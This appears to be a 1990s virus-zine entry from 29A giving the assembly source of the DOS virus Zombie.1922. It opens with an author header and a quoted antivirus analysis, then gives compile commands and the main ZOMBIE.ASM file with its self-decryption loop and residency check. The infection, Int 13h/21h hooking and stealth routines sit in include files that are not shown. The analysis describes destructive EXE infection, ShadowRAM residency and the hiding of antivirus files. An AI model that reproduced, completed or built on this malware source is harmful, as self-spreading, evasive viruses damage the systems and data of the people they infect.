   ;
   ;                           ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                           ³     Z0MBiE.1922     ³
   ;                           ³  written by Z0MBiE  ³
   ;                           ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ; This virus is related  with the Win95.Z0MBiE virus, also  included in this
   ; issue of 29A, in the "Win32"  section. It is dropped in the root directory
   ; of every drive in which Win95.Z0MBiE has infected a PE file, with the sys-
   ; tem and archive attributes. From  that moment onwards, Z0MBiE.1922 is able
   ; to spread all over the HD with independence of what his "daddy" does. This
   ; DOS virus is the first ever to use ShadowRAM in order to go resident. This
   ; new technique has many advantages, and maybe the most important is that it
   ; is impossible to unhook the  virus by normal means, as its  code is locked
   ; and is only accesable when performing the infection tasks, after being ca-
   ; lled from int 13h or int 21h. Z0MBiE has many other peculiarities, descri-
   ; bed below by Igor Daniloff in his analysis of this virus.
   ;
   ;
   ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
   ; Zombie.1922
   ;
   ; Igor Daniloff
   ; DialogueScience
   ;
   ; Zombie.1922 is a destructive resident encrypted virus. It is a "product
   ; of the life activity" of Win95.Zombie. After creation, Zombie.1922
   ; "leads a full-fledged life" all by itself. Win95.Zombie creates a file
   ; ZSetUP.EXE in the root directory of every drive it infects. On starting
   ; ZSetUP.EXE, the virus code gets control and examines whether it (the
   ; virus) can open RAM Shadow for writing. Then it determines a 2122-byte
   ; block of free memory (of zero bytes) in the segment 0C000h. If it
   ; succeeds in this, the virus determines the location address of the 8x14
   ; system font. If this font exists in the segment 0C000h and if the address
   ; of the original Int 13h handler is available in the segment 0F000h, the
   ; virus opens RAM Shadow for writing and plants its code in the zero byte
   ; region or at the location of the 8x14 system font. Then the virus
   ; modifies the original Int 13h handler by inserting a command for
   ; transferring control to the virus procedure. Finally, RAM Shadow is
   ; "closed" to lock it from further writing.
   ;
   ; On reading the sector (f.2 Int 13h) of initial signature "MZ", the virus
   ; "intercepts" Int 21h, whose handler infects every EXE that is started or
   ; opened for reading or writing.  While reading the sectors containing
   ; directory or file entries, the virus looks for the byte strings ADINF,
   ; AIDS, AVP, WEB, DRWEB, ---, CPP, C, S-ICE, TD, DEBUG, WEB70801, and CA.
   ; On detecting any such string, the virus sets in the sector just read the
   ; first byte OE5h (attribute for a deleted file) for the detected entry and
   ; "overwrites" all other bytes with zeros in the entry.  Thus, if the virus
   ; is active, the operating system will not even suspect the presence of
   ; these files in the drive.
   ;
   ; The virus handlers of Int 13h and Int 21h, upon receiving control, "open"
   ; RAM Shadow, launch their procedures, and finally "close" RAM Shadow.
   ; Without appropriate shadow memory manipulations, it is not possible to
   ; kill or eradicate the resident virus code.  On detecting this virus in
   ; the memory, the system must be cured by starting the machine from an
   ; independent boot diskette containing a "clean" operating system.
   ; Beware! Zombie.1922 is, apparently, clever enough to open RAM
   ; Shadow on most of the modern system boards with Pentium. The virus
   ; contains a few text strings:
   ;
   ;   Z0MBiE`1668 v1.00 (c) 1997 Z0MBiE
   ;   Tnx to S.S.R.
   ;   ShadowRAM/Virtual Process Infector
   ;   ShadowRAM Technology (c) 1996,97 Z0MBiE
   ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
   ;
   ;
   ; Compiling it
   ; ÄÄÄÄÄÄÄÄÄÄÄÄ
   ; tasm /m zombie.asm
   ; tlink zombie.obj
   ; exe2bin zombie.exe zombie.com
   ;
   ;
   ; - -[ZOMBIE.ASM] - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8

   include         #equ.inc
   include         #macro.inc
   include         #struc.inc
   include         #header.inc

                   org     100h
   start:
                   jmp     tsr_sh

   exe_start:      mov     al, es:[0028h]
   sux             label   word
                   not     al
                   ; normal: al=0
                   ; web:    al<>0
                   xor     cs:@@sux, al

                   lea     si, real_code
                   mov     di, si
   @@2:            mov     cx, 8
   @@1:            segcs   lodsb
                   inc     ax
                   shl     bx, 1
                   or      bx, ax
                   loop    @@1
                   mov     cs:[di], bl
   @@sux           label   byte
                   inc     di
                   cmp     di, offset real_code + vir_size + stamms_max_ip
                   jne     @@2
                   jmp     $+2

   decr_size       equ     $-start

   real_code:      call    stamm

                   mov     ax, in_ID
                   int     13h
                   cmp     ax, out_ID
                   je      @@continue

                   call    tsr_sh

   @@continue:     mov     cx, es
                   add     cx, 16

                   mov     ax, 1234h
   lastword        save_ss
                   add     ax, cx
                   mov     ss, ax
                   mov     sp, 1234h
   lastword        save_sp

                   mov     ax, 1234h
   lastword        save_cs
                   add     ax, cx
                   push    ax
                   push    1234h
   lastword        save_ip

                   xor     ax, ax

                   retf

   include         rnd.inc
   include         sh_ram.inc
   include         tsr_sh.inc
   include         findR13.inc
   include         ints.inc
   include         infect.inc
   include         hook21.inc
   include         fuck13.inc
   include         switch13.inc
   include         const.inc
   include         stamms.inc

   vir_size        equ     $-start

   include         var.inc

   tsr_size        equ     $-start

                   org     ($-start+256+15) and (not 15)
                   db      256 dup (?)
   exe_endofstack:
   exe_memory      equ     ($-start+256+15)/16

                   end start
